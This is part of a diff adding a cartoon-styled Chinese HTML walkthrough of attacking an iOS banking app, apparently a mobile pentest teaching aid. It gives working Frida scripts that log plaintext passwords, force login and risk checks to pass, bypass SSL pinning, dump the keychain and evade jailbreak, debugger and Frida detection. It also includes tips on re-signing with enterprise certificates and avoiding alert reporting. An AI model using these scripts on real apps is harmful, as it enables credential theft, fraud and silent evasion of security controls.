+        （<code>get-task-allow</code> 允许任意调试器附加、<code>keychain-access-groups</code> 扩大凭证访问范围）。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>已注入的 .app + 签名证书 + 伪造 entitlements</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>可安装的已签名 App</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ security find-identity -v -p codesigning
+  <span class="n">1</span>) <span class="s">"Apple Development: attacker@evil.com (XXXXXXXX)"</span>
+  <span class="n">2</span>) <span class="s">"iPhone Distribution: EvilCorp (YYYYYYYY)"</span>   <span class="e">← 企业证书，可大规模分发</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">重签名 + 伪造权限</span> ⬇️</div>
+      <div class="code"><span class="lbl">重签名</span>$ codesign -f -s <span class="s">"iPhone Distribution: EvilCorp"</span> \
+    --entitlements <span class="i">ent.plist</span> --deep Payload/TargetApp.app
+
+$ codesign -dv --verbose=<span class="n">4</span> Payload/TargetApp.app
+Authority=<span class="s">iPhone Distribution: EvilCorp</span>
+TeamIdentifier=<span class="n">YYYYYYYY</span>
+<span class="c"># ent.plist 中伪造的关键项：</span>
+<span class="at">&lt;key&gt;get-task-allow&lt;/key&gt;&lt;true/&gt;</span>              <span class="e">← 任意调试器可附加</span>
+<span class="at">&lt;key&gt;keychain-access-groups&lt;/key&gt;</span>          <span class="e">← 扩大凭证读取范围</span>
+
+<span class="c"># 打包回 IPA，供下一步安装</span>
+$ zip -qr <span class="r">TargetApp-patched.ipa</span> Payload/</div>
+      <div class="tips">
+        <span class="tip info"><code>get-task-allow=true</code> 让 LLDB / Frida 可无条件附加，反调试形同虚设</span>
+        <span class="tip warn">企业证书重签 = 可绕过 App Store 审核大规模分发，是灰产分发主流</span>
+        <span class="tip cmd">codesign -dv --verbose=4 Payload/TargetApp.app</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3c -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff922b">装上去！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff922b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff922b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff922b"/><circle cx="59" cy="31" r="4.5" fill="#ff922b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff922b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff922b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">DEPLOY</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff922b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff922b"/>
+        <line x1="70" y1="64" x2="84" y2="56" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <polygon points="86,46 98,52 90,66" fill="#ff922b" opacity=".9"/>
+        <circle cx="88" cy="58" r="3" fill="#ffd93d"/>
+      </svg>
+      <div class="char-label">投送员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff922b">3c</div>
+      <div class="step-name">安装启动</div>
+    </div>
+    <div class="card" style="border-color:#ff922b; --acc:#ff922b">
+      <h2>🚀 安装与启动验证 <span class="en">Deploy</span> <span class="parent-tag" style="background:#ff922b">③ 重打包</span></h2>
+      <div class="desc">
+        把重打包的 IPA 装到越狱设备或测试机，验证能否启动、Frida 能否附加。
+        如果 App 有完整性校验，会在启动时闪退 —— 那就回到 2c 找校验函数。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>TargetApp-patched.ipa</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>可观测、可篡改的运行时环境</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ ideviceinstaller -i TargetApp-patched.ipa
+Install: <span class="r">Complete</span>
+
+$ frida-ps -U | grep -i target
+  <span class="n">1337</span>  TargetApp                    <span class="c">← 进程已起，Gadget 已加载</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">附加进程，确认控制权</span> ⬇️</div>
+      <div class="code"><span class="lbl">Frida 附加</span>$ frida -U -n TargetApp
+[USB::iPhone::TargetApp]-&gt; <span class="i">ObjC.classes.NSBundle.mainBundle()</span>
+<span class="r">NSBundle &lt;/var/containers/Bundle/Application/.../TargetApp.app&gt;</span>
+
+<span class="c"># 若启动即闪退 → 说明有完整性校验，回到 2c 静态定位</span>
+$ idevicesyslog | grep -i <span class="s">'target\|crash'</span>
+TargetApp[1337] &lt;Error&gt;: <span class="e">signature mismatch, exiting</span></div>
+      <div class="tips">
+        <span class="tip info">到这里「可观测 + 可篡改」的环境就搭好了，接下来全是动态的活</span>
+        <span class="tip warn">启动闪退 = 存在签名/完整性校验，需先到 2c 定位校验函数再 hook 掉</span>
+        <span class="tip cmd">ideviceinstaller -i TargetApp-patched.ipa</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 大步骤 4 ============ -->
+  <div class="phase-divider right">
+    <div class="phase-banner p-dynamic">
+      <div class="phase-title">📡 ④ 动态分析 · Dynamic Analysis</div>
+      <div class="cmd">$ objection -g com.example.bankwallet explore</div>
+    </div>
+  </div>
+
+  <!-- 4a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#20c997">扫描全场</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#20c997"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#20c997" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#20c997"/><circle cx="59" cy="31" r="4.5" fill="#20c997"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#20c997" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#20c997" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">ENUM</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#20c997"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#20c997"/>
+        <line x1="30" y1="64" x2="18" y2="72" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M2 74 a14 14 0 0 1 20 0" fill="none" stroke="#20c997" stroke-width="2.5"/>
+        <path d="M6 74 a9 9 0 0 1 12 0" fill="none" stroke="#20c997" stroke-width="2"/>
+        <circle cx="12" cy="76" r="2.5" fill="#20c997"/>
+      </svg>
+      <div class="char-label">雷达手</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#20c997">4a</div>
+      <div class="step-name">运行时枚举</div>
+    </div>
+    <div class="card" style="border-color:#20c997; --acc:#20c997">
+      <h2>📡 运行时类与方法枚举 <span class="en">Runtime Enumeration</span> <span class="parent-tag" style="background:#20c997">④ 动态分析</span></h2>
+      <div class="desc">
+        在真实运行时枚举类、方法、实例变量、已加载模块。
+        比静态更准确 —— <strong>能拿到 class-dump 漏掉的 Swift 类、动态生成的类、被反射调用的方法</strong>。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>运行中的 TargetApp 进程</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>完整类/方法/模块清单（含 Swift）</div>
+      </div>
+      <div class="code"><span class="lbl">objection</span>$ objection -g com.example.bankwallet explore
+com.example.bankwallet on (iPhone: <span class="n">17.0</span>) [usb] # <span class="f">ios hooking list classes</span>
+JailbreakDetector   LoginManager   KeychainHelper   CryptoHelper
+RiskControl         PaymentManager  WebViewController   <span class="c">… 1204 个</span>
+
+# <span class="f">ios hooking list class_methods</span> KeychainHelper
+- (id) <span class="i">loadTokenForService:</span>(id) service
+- (void) <span class="i">savePassword:</span>(id) pwd <span class="i">forAccount:</span>(id) acc
+- (BOOL) <span class="i">isBiometricEnabled</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">查看进程运行环境</span> ⬇️</div>
+      <div class="code"><span class="lbl">env</span># <span class="f">env</span>
+Name: TargetApp   PID: <span class="n">1337</span>   Arch: arm64   Path: /var/containers/...
+
+<span class="c"># 也常用 Frida 原生 API</span>
+$ frida -U -n TargetApp -e <span class="s">'console.log(ObjC.classes.JailbreakDetector.$ownMethods)'</span></div>
+      <div class="tips">
+        <span class="tip info">运行时能看到被 <code>objc_getClass</code> 动态创建、class-dump 抓不到的类</span>
+        <span class="tip warn">枚举动作本身可能触发反调试 / 反 Frida 检测 → 先做 4e 绕过</span>
+        <span class="tip cmd">objection -g com.example.bankwallet explore</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#20c997">上钩了！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#20c997"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#20c997" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#20c997"/><circle cx="59" cy="31" r="4.5" fill="#20c997"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#20c997" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#20c997" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">HOOK</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#20c997"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#20c997"/>
+        <line x1="30" y1="62" x2="18" y2="50" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="12" y1="20" x2="12" y2="52" stroke="#20c997" stroke-width="2.5"/>
+        <path d="M12 52 a7 7 0 1 1 -7 -7" fill="none" stroke="#20c997" stroke-width="3"/>
+      </svg>
+      <div class="char-label">钓鱼手</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#20c997">4b</div>
+      <div class="step-name">Hook 业务</div>
+    </div>
+    <div class="card" style="border-color:#20c997; --acc:#20c997">
+      <h2>🪝 Hook 关键业务方法 <span class="en">Method Hooking</span> <span class="parent-tag" style="background:#20c997">④ 动态分析</span></h2>
+      <div class="desc">
+        用 Frida 拦截<strong>登录校验、风控判断、支付金额、加解密</strong>等关键方法，
+        读参数、改返回值。客户端的一切校验在这一步都失效。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>方法签名清单（来自 2b / 4a）</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>明文参数（密码/Token）+ 被篡改的返回值</div>
+      </div>
+      <div class="code"><span class="lbl">hook.js</span><span class="k">const</span> Login = ObjC.classes.<span class="t">LoginManager</span>;
+Interceptor.<span class="f">attach</span>(Login[<span class="s">'- validatePassword:'</span>].implementation, {
+  <span class="f">onEnter</span>(args) {
+    <span class="c">// args[0]=self, args[1]=SEL, args[2]=第一个参数</span>
+    console.<span class="f">log</span>(<span class="s">'[+] 明文密码: '</span> +
+      <span class="k">new</span> ObjC.Object(args[<span class="n">2</span>]).<span class="f">toString</span>());
+  },
+  <span class="f">onLeave</span>(ret) {
+    ret.<span class="f">replace</span>(ptr(<span class="n">1</span>));      <span class="c">// 强制返回 true</span>
+    console.<span class="f">log</span>(<span class="s">'[+] 校验已改写成 true'</span>);
+  }
+});
+
+<span class="c">// 也可直接替换实现，跳过整个函数体</span>
+<span class="k">const</span> Risk = ObjC.classes.<span class="t">RiskControl</span>;
+Risk[<span class="s">'- evaluateRisk:'</span>].implementation = ObjC.implement(
+  Risk[<span class="s">'- evaluateRisk:'</span>], (self, sel, ctx) =&gt; <span class="n">0</span>);  <span class="c">// 0 = 无风险</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">运行 Hook，看返回值被改写</span> ⬇️</div>
+      <div class="code"><span class="lbl">运行结果</span>$ frida -U -f com.example.bankwallet -l hook.js
+[+] 明文密码: <span class="e">P@ssw0rd2024!</span>
+[+] 校验已改写成 <span class="r">true</span>
+[+] RiskControl.evaluateRisk → <span class="r">0</span>  <span class="c">（风控被完全绕过）</span></div>
+      <div class="tips">
+        <span class="tip info">Hook 返回值 = 绕过<strong>任意</strong>客户端校验（登录、风控、License、次数限制）</span>
+        <span class="tip warn">只改客户端没有意义 —— 服务端二次校验才是真防线，评分时要区分</span>
+        <span class="tip cmd">frida -U -f com.example.bankwallet -l hook.js</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#20c997">抓到明文</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#20c997"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#20c997" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#20c997"/><circle cx="59" cy="31" r="4.5" fill="#20c997"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#20c997" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#20c997" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">MITM</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#20c997"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#20c997"/>
+        <line x1="30" y1="62" x2="16" y2="56" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M2 46 l16 4 l-2 16 l-14 -4 z" fill="none" stroke="#20c997" stroke-width="2.5"/>
+        <line x1="4" y1="50" x2="18" y2="54" stroke="#20c997" stroke-width="1.5" opacity=".6"/>
+        <line x1="3" y1="58" x2="17" y2="62" stroke="#20c997" stroke-width="1.5" opacity=".6"/>
+      </svg>
+      <div class="char-label">抓包手</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#20c997">4c</div>
+      <div class="step-name">流量劫持</div>
+    </div>
+    <div class="card" style="border-color:#20c997; --acc:#20c997">
+      <h2>🕸️ 流量劫持与 SSL Pinning 绕过 <span class="en">Traffic Interception</span> <span class="parent-tag" style="background:#20c997">④ 动态分析</span></h2>
+      <div class="desc">
+        配代理抓包；若 App 做了<strong>证书绑定（SSL Pinning）</strong>，
+        用 Frida Hook 掉 <code>SecTrustEvaluate</code> / <code>URLSession:didReceiveChallenge:</code> 等校验点，让代理证书被信任。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>设备代理指向 Burp + 目标 App 的网络请求</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>全量明文 API（含 Token、业务参数）</div>
+      </div>
+      <div class="code"><span class="lbl">ssl_bypass.js</span><span class="c">// ① 底层：让 SecTrustEvaluate 永远返回成功</span>
+<span class="k">const</span> SecTrustEvaluate = Module.<span class="f">findExportByName</span>(
+    <span class="s">"Security"</span>, <span class="s">"SecTrustEvaluate"</span>);
+Interceptor.<span class="f">replace</span>(SecTrustEvaluate, <span class="k">new</span> <span class="t">NativeCallback</span>(
+    () =&gt; <span class="n">0</span> <span class="c">/* errSecSuccess */</span>, <span class="s">'int'</span>, [<span class="s">'pointer'</span>, <span class="s">'pointer'</span>]));
+
+<span class="c">// ② 上层：BoringSSL / 自实现 Pin 也要一并 hook</span>
+[<span class="s">'SSL_CTX_set_verify'</span>, <span class="s">'SSL_set_verify'</span>, <span class="s">'X509_verify_cert'</span>]
+  .<span class="f">forEach</span>(n =&gt; {
+    <span class="k">const</span> p = Module.<span class="f">findExportByName</span>(<span class="k">null</span>, n);
+    <span class="k">if</span> (p) Interceptor.<span class="f">replace</span>(p, <span class="k">new</span> <span class="t">NativeCallback</span>(
+      () =&gt; <span class="n">1</span>, <span class="s">'int'</span>, [<span class="s">'pointer'</span>,<span class="s">'pointer'</span>,<span class="s">'pointer'</span>,<span class="s">'pointer'</span>]));
+  });</div>
+      <div class="transform-arrow">⬇️ <span class="label">绕过 Pin 后抓到明文</span> ⬇️</div>
+      <div class="code"><span class="lbl">抓包结果</span>$ objection -g com.example.bankwallet explore
+com.example.bankwallet [usb] # <span class="f">ios sslpinning disable</span>
+[+] <span class="r">Pin: Bypassed</span>   (3 hooks installed)
+
+<span class="c"># Burp 中看到的明文流量</span>
+<span class="p">GET</span> /v1/account/balance <span class="p">HTTP/1.1</span>
+<span class="at">Host:</span> api.example.com
+<span class="at">Authorization: Bearer</span> <span class="e">eyJhbGciOiJIUzI1NiIsInR5cCI6...</span>
+<span class="at">X-Device-Id:</span> A1B2C3D4-...</div>
+      <div class="tips">
+        <span class="tip info">Pin 绕过 = 全量 API 暴露，可任意改包、重放、模糊测试</span>
+        <span class="tip warn">现代 App 常有多层 Pin（Alamofire + 自实现 + BoringSSL），需逐层定位</span>
+        <span class="tip cmd">objection … explore → ios sslpinning disable</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#20c997">拿到钥匙</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#20c997"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#20c997" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#20c997"/><circle cx="59" cy="31" r="4.5" fill="#20c997"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#20c997" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#20c997" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">KEYCHN</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#20c997"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#20c997"/>
+        <line x1="30" y1="64" x2="18" y2="70" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="10" cy="62" r="7" fill="none" stroke="#20c997" stroke-width="3"/>
+        <line x1="14" y1="68" x2="24" y2="82" stroke="#20c997" stroke-width="3"/>
+        <line x1="19" y1="75" x2="24" y2="72" stroke="#20c997" stroke-width="2.5"/>
+        <line x1="22" y1="79" x2="27" y2="76" stroke="#20c997" stroke-width="2.5"/>
+      </svg>
+      <div class="char-label">钥匙匠</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#20c997">4d</div>
+      <div class="step-name">本地存储提取</div>
+    </div>
+    <div class="card" style="border-color:#20c997; --acc:#20c997">
+      <h2>🔑 本地存储与 Keychain 提取 <span class="en">Storage Extraction</span> <span class="parent-tag" style="background:#20c997">④ 动态分析</span></h2>
+      <div class="desc">
+        转储 <strong>Keychain、NSUserDefaults、沙盒文件、Realm/CoreData 数据库、Cookie、粘贴板与日志</strong>。
+        凭证一旦明文落盘，设备丢失即账户失守。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>App 沙盒 + Keychain 访问权限</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>Token / PIN / 手机号 / 银行卡缓存</div>
+      </div>
+      <div class="code"><span class="lbl">objection</span>com.example.bankwallet [usb] # <span class="f">ios keychain dump</span>
+[{
+  <span class="s">"service"</span>: <span class="s">"com.example.bankwallet"</span>,
+  <span class="s">"account"</span>: <span class="s">"session_token"</span>,
+  <span class="s">"value"</span>:   <span class="e">"eyJhbGciOiJIUzI1NiIsInR5cCI6..."</span>
+}, {
+  <span class="s">"service"</span>: <span class="s">"com.example.bankwallet"</span>,
+  <span class="s">"account"</span>: <span class="s">"pin_code"</span>,
+  <span class="s">"value"</span>:   <span class="e">"1234"</span>            <span class="c">← 支付 PIN 明文存储</span>
+}, {
+  <span class="s">"account"</span>: <span class="s">"device_id"</span>, <span class="s">"value"</span>: <span class="s">"A1B2C3D4-..."</span>
+}]</div>
+      <div class="transform-arrow">⬇️ <span class="label">继续翻其他存储位置</span> ⬇️</div>
+      <div class="code"><span class="lbl">其他存储</span>com.example.bankwallet [usb] # <span class="f">ios nsuserdefaults get</span>
+{ <span class="s">"user_phone"</span>: <span class="s">"13800138000"</span>, <span class="s">"last_login"</span>: <span class="s">"2026-10-12 09:31"</span> }
+
+com.example.bankwallet [usb] # <span class="f">ios cookies get</span>
+$ sqlite3 Documents/<span class="i">cache.db</span> <span class="s">"select * from cards"</span>   <span class="c">← 银行卡缓存</span></div>
+      <div class="tips">
+        <span class="tip info"><code>kSecAttrAccessibleWhenUnlocked</code> 是系统<b>默认</b>值；若设成 <code>kSecAttrAccessibleAlways</code> / <code>...AfterFirstUnlock</code>，锁屏状态下凭证同样可读</span>
+        <span class="tip warn">明文 PIN / Token 落盘 = 设备丢失即账户失守，是评级里的高危项</span>
+        <span class="tip cmd">objection … explore → ios keychain dump</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4e -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#20c997">看不见我</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#20c997"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#20c997" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#20c997"/><circle cx="59" cy="31" r="4.5" fill="#20c997"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#20c997" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#20c997" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">BYPASS</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#20c997" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#20c997"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#20c997"/>
+        <line x1="30" y1="64" x2="16" y2="60" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M2 50 l14 -6 l14 6 v12 c0 10 -14 16 -14 16 s-14 -6 -14 -16 z" fill="none" stroke="#20c997" stroke-width="2.5"/>
+        <path d="M6 58 l16 16" stroke="#20c997" stroke-width="2.5"/>
+      </svg>
+      <div class="char-label">隐身者</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#20c997">4e</div>
+      <div class="step-name">检测绕过</div>
+    </div>
+    <div class="card" style="border-color:#20c997; --acc:#20c997">
+      <h2>🛡️ 越狱 / 反调试 / 完整性校验绕过 <span class="en">Detection Bypass</span> <span class="parent-tag" style="background:#20c997">④ 动态分析</span></h2>
+      <div class="desc">
+        Hook 掉越狱检测、调试器检测、模拟器检测、Frida 检测、代码签名校验，
+        让 App 在完全受控的环境里正常运行。<strong>所有客户端检测都只是提高成本，不是防线。</strong>
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>检测函数清单（来自 2b / 2c / 4a）</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>无检测的干净运行环境</div>
+      </div>
+      <div class="code"><span class="lbl">bypass.js</span><span class="c">// ① 批量 Hook 越狱/调试/Frida 检测，统一返回「安全」</span>
+[<span class="s">'isJailbroken'</span>, <span class="s">'checkCydia'</span>, <span class="s">'checkFork'</span>,
+ <span class="s">'isDebuggerAttached'</span>, <span class="s">'checkFrida'</span>,
+ <span class="s">'verifySignature'</span>, <span class="s">'isTampered'</span>].<span class="f">forEach</span>(m =&gt; {
+  <span class="k">const</span> impl = ObjC.classes.<span class="t">JailbreakDetector</span>[m];
+  <span class="k">if</span> (impl) Interceptor.<span class="f">attach</span>(impl.implementation, {
+    <span class="f">onLeave</span>: r =&gt; r.<span class="f">replace</span>(ptr(<span class="n">0</span>))     <span class="c">// 0 = 不是越狱设备</span>
+  });
+});
+
+<span class="c">// ② 底层反调试：ptrace(PT_DENY_ATTACH) 让调试器无法附加</span>
+<span class="k">const</span> ptrace = Module.<span class="f">findExportByName</span>(<span class="k">null</span>, <span class="s">'ptrace'</span>);
+Interceptor.<span class="f">replace</span>(ptrace, <span class="k">new</span> <span class="t">NativeCallback</span>(
+  () =&gt; <span class="n">0</span>, <span class="s">'int'</span>, [<span class="s">'int'</span>,<span class="s">'int'</span>,<span class="s">'pointer'</span>,<span class="s">'int'</span>]));
+
+<span class="c">// ③ 反调试：sysctl 读 P_TRACED 判断是否被调试 → 抹掉该标志位</span>
+<span class="k">const</span> sysctl = Module.<span class="f">findExportByName</span>(<span class="k">null</span>, <span class="s">'sysctl'</span>);
+Interceptor.<span class="f">attach</span>(sysctl, {
+  <span class="f">onEnter</span>(args) { <span class="k">this</span>.out = args[<span class="n">2</span>]; },        <span class="c">// args[2] = oldp 输出缓冲区</span>
+  <span class="f">onLeave</span>(ret) {
+    <span class="k">if</span> (ret.<span class="f">toInt32</span>() !== <span class="n">0</span> || <span class="k">this</span>.out.<span class="f">isNull</span>()) <span class="k">return</span>;
+    <span class="k">const</span> pFlag = <span class="k">this</span>.out.<span class="f">add</span>(<span class="n">32</span>);          <span class="c">// kinfo_proc.kp_proc.p_flag（arm64 偏移 32）</span>
+    pFlag.<span class="f">writeU32</span>(pFlag.<span class="f">readU32</span>() &amp; ~<span class="n">0x800</span>);    <span class="c">// 抹掉 P_TRACED</span>
+  }
+});
+
+<span class="c">// ④ 反 Frida 检测（查 27042 端口 / frida-agent.dylib 映射）——</span>
+<span class="c">//    运行时 hook 很难隐藏模块映射，实战做法是起 frida-server 时就规避：</span>
+<span class="c">//    $ frida-server -l 0.0.0.0:8888   # 改默认端口，避开 27042 检测</span>
+<span class="c">//    $ mv frida-server dshelper       # 改进程名，避开 ps 枚举</span>
+<span class="c">//    无越狱时用已改名的 FridaGadget.dylib 注入（见 3a）</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">绕过结果</span> ⬇️</div>
+      <div class="code"><span class="lbl">运行结果</span>[+] JailbreakDetector.isJailbroken   → <span class="r">false</span>
+[+] JailbreakDetector.checkFrida      → <span class="r">false</span>
+[+] ptrace(PT_DENY_ATTACH)            → <span class="r">拦截，调试器可正常附加</span>
+[+] <span class="r">绕过完成，App 正常运行且无告警上报</span></div>
+      <div class="tips">
+        <span class="tip info">检测逻辑分散在多个类/后台线程时，需逐一 hook，漏一个就会触发风控上报</span>
+        <span class="tip warn">部分 App 会用服务端下发检测策略 + 静默上报，绕过时要注意别触发告警</span>
+        <span class="tip cmd">frida -U -f com.example.bankwallet -l bypass.js</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 大步骤 5 ============ -->
+  <div class="phase-divider left">
+    <div class="phase-banner p-exploit">
+      <div class="phase-title">💥 ⑤ 攻击落地 · Exploitation</div>
+      <div class="cmd">$ ideviceinstaller -i TargetApp-patched.ipa</div>
+    </div>
+  </div>
+
+  <!-- 5a -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff6b6b">加个料～</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff6b6b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff6b6b"/><circle cx="59" cy="31" r="4.5" fill="#ff6b6b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff6b6b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff6b6b" opacity=".92"/>
